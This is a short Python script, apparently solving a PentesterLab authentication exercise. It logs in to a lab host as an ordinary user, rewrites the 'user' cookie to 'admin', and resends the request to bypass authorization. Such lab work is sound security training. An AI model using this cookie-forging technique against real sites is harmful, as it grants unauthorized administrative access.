import requests

# https://stackoverflow.com/questions/31554771/how-to-use-cookies-in-python-requests

data = {'username':'user1', 'password': 'pentesterlab'}
r = requests.get('http://10.0.1.11/authentication/example3/', params=data)
# print(r.url)
cookies = r.cookies.get_dict()
cookies['user'] = 'admin'

print(cookies)
r = requests.get('http://10.0.1.11/authentication/example3/', cookies=cookies)
print(r.url)
print(r.content)

